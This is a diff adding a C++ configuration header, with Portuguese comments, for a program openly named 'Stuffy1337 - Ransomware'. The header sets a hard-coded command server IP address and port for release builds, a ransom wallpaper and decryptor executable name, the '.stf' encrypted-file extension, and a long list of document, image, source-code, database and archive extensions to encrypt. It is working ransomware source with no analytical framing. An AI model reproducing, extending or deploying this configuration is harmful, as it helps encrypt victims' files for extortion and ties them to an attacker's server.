@@ -1,0 +1,140 @@
+#pragma once // Incluir apenas uma vez
+
+#ifndef CONFIG // Verifica se a CONFIG não está definida
+#define CONFIG // Define a CONFIG
+
+// Inclusões de livrarias
+#include <set>
+#include <iostream>
+#include <string>
+
+using namespace std;
+
+#define APPLICATION_NAME L"Stuffy1337 - Ransomware" // constante com o nome da aplicação
+#define RANDOM_PASSWORD_LENGTH 32 // Constante com o tamanho da chave
+#define DEFAULT_ENCRYPT_EXTENSION "stf" // Constante com a extenção a ser definida
+#define WALLPAPER_PATH "/background" // Constante com o directório da imagem
+#define WALLPAPER_LOCAL_NAME "\\@StuffyWallpaper@.png" // Constante com o nome da imagem
+#if _DEBUG
+	#define DECRYPTER_PATH "/decrypterD" // Constante com o directório da aplicação de desencriptação
+#else
+	#define DECRYPTER_PATH "/decrypter"
+#endif
+#define DECRYPTER_LOCAL_NAME "\\@Stuffy1337Decryptor@.exe" // Constante com o nome da aplicação de desencriptação
+
+#if _DEBUG
+	#define HOST_NAME "127.0.0.1" // Constante com o valor do host do servidor
+	#define HOST_PORT 5000 // Constante com o valor da porta do servidor
+#else 
+	#define HOST_NAME "188.37.216.191" // Constante com o valor do host do servidor
+	#define HOST_PORT 80 // Constante com o valor da porta do servidor
+#endif
+
+#if _DEBUG
+	#define SEARCH_PATH "test"
+#else 
+	#define SEARCH_PATH ""
+#endif
+
+// Declara o namespace que nos permite uma desambiguação das extenções
+namespace config {
+	// São declarados os "contentores" que armazenam elementos exclusivos seguidos de uma ordem específica
+	static std::set < std::string > ENCRYPT_EXTENSIONS; // "Contentor" que vai armazenar as extenções a serem encriptadas
+	static std::set < std::string > DECRPYTION_EXTENSIONS; // "Contentor" que vai armazenar as extenções a serem desencriptadas
+
+	static void init() {
+		ENCRYPT_EXTENSIONS.clear(); // Limpa o coteúdo do "contentor"
+		DECRPYTION_EXTENSIONS.clear(); // Limpa o coteúdo do "contentor"
+
+		// Adiciona as extenções ao "Contentor" a serem encriptadas
+		#if _DEBUG
+				ENCRYPT_EXTENSIONS.insert("wasd");
+				ENCRYPT_EXTENSIONS.insert("jpg");
+				ENCRYPT_EXTENSIONS.insert("png");
+		#else
+				ENCRYPT_EXTENSIONS.insert("jpeg");
+				ENCRYPT_EXTENSIONS.insert("jpg");
+				ENCRYPT_EXTENSIONS.insert("png");
+				ENCRYPT_EXTENSIONS.insert("gif");
+				ENCRYPT_EXTENSIONS.insert("bmp");
+				ENCRYPT_EXTENSIONS.insert("mp4");
+				ENCRYPT_EXTENSIONS.insert("avi");
+				ENCRYPT_EXTENSIONS.insert("mov");
+				ENCRYPT_EXTENSIONS.insert("wmv");
+				ENCRYPT_EXTENSIONS.insert("doc");
+				ENCRYPT_EXTENSIONS.insert("dot");
+				ENCRYPT_EXTENSIONS.insert("wbk");
+				ENCRYPT_EXTENSIONS.insert("docx");
+				ENCRYPT_EXTENSIONS.insert("docm");
+				ENCRYPT_EXTENSIONS.insert("dotx");
+				ENCRYPT_EXTENSIONS.insert("dotm");
+				ENCRYPT_EXTENSIONS.insert("docb");
+				ENCRYPT_EXTENSIONS.insert("xls");
+				ENCRYPT_EXTENSIONS.insert("xlt");
+				ENCRYPT_EXTENSIONS.insert("xlm");
+				ENCRYPT_EXTENSIONS.insert("xlsx");
+				ENCRYPT_EXTENSIONS.insert("xlsm");
+				ENCRYPT_EXTENSIONS.insert("xltx");
+				ENCRYPT_EXTENSIONS.insert("xltm");
+				ENCRYPT_EXTENSIONS.insert("xlsb");
+				ENCRYPT_EXTENSIONS.insert("xla");
+				ENCRYPT_EXTENSIONS.insert("xlam");
+				ENCRYPT_EXTENSIONS.insert("xll");
+				ENCRYPT_EXTENSIONS.insert("xlw");
+				ENCRYPT_EXTENSIONS.insert("ppt");
+				ENCRYPT_EXTENSIONS.insert("pot");
+				ENCRYPT_EXTENSIONS.insert("pps");
+				ENCRYPT_EXTENSIONS.insert("pptx");
+				ENCRYPT_EXTENSIONS.insert("pptm");
+				ENCRYPT_EXTENSIONS.insert("potx");
+				ENCRYPT_EXTENSIONS.insert("potm");
+				ENCRYPT_EXTENSIONS.insert("ppam");
+				ENCRYPT_EXTENSIONS.insert("ppsx");
+				ENCRYPT_EXTENSIONS.insert("ppsm");
+				ENCRYPT_EXTENSIONS.insert("sldx");
+				ENCRYPT_EXTENSIONS.insert("sldm");
+				ENCRYPT_EXTENSIONS.insert("accdb");
+				ENCRYPT_EXTENSIONS.insert("accde");
+				ENCRYPT_EXTENSIONS.insert("accdt");
+				ENCRYPT_EXTENSIONS.insert("accdr");
+				ENCRYPT_EXTENSIONS.insert("pub");
+				ENCRYPT_EXTENSIONS.insert("xps");
+				ENCRYPT_EXTENSIONS.insert("xml");
+				ENCRYPT_EXTENSIONS.insert("vdx");
+				ENCRYPT_EXTENSIONS.insert("vsx");
+				ENCRYPT_EXTENSIONS.insert("vtx");
+				ENCRYPT_EXTENSIONS.insert("xsn");
+				ENCRYPT_EXTENSIONS.insert("jar");
+				ENCRYPT_EXTENSIONS.insert("html");
+				ENCRYPT_EXTENSIONS.insert("mp3");
+				ENCRYPT_EXTENSIONS.insert("mpeg");
+				ENCRYPT_EXTENSIONS.insert("pdf");
+				ENCRYPT_EXTENSIONS.insert("rar");
+				ENCRYPT_EXTENSIONS.insert("zip");
+				ENCRYPT_EXTENSIONS.insert("php");
+				ENCRYPT_EXTENSIONS.insert("c");
+				ENCRYPT_EXTENSIONS.insert("cpp");
+				ENCRYPT_EXTENSIONS.insert("cs");
+				ENCRYPT_EXTENSIONS.insert("js");
+				ENCRYPT_EXTENSIONS.insert("txt");
+				ENCRYPT_EXTENSIONS.insert("wav");
+				ENCRYPT_EXTENSIONS.insert("psd");
+				ENCRYPT_EXTENSIONS.insert("cdr");
+				ENCRYPT_EXTENSIONS.insert("ai");
+				ENCRYPT_EXTENSIONS.insert("css");
+				ENCRYPT_EXTENSIONS.insert("asp");
+				ENCRYPT_EXTENSIONS.insert("aspx");
+				ENCRYPT_EXTENSIONS.insert("jsp");
+				ENCRYPT_EXTENSIONS.insert("cfm");
+				ENCRYPT_EXTENSIONS.insert("svg");
+				ENCRYPT_EXTENSIONS.insert("tif");
+				ENCRYPT_EXTENSIONS.insert("sql");
+				ENCRYPT_EXTENSIONS.insert("7z");
+				ENCRYPT_EXTENSIONS.insert("tar");
+				ENCRYPT_EXTENSIONS.insert("gz");
+		#endif
+		DECRPYTION_EXTENSIONS.insert(DEFAULT_ENCRYPT_EXTENSION); // Adiciona as extenções de desencriptação iguais as extenções de encriptação
+	}
+}
+
+#endif
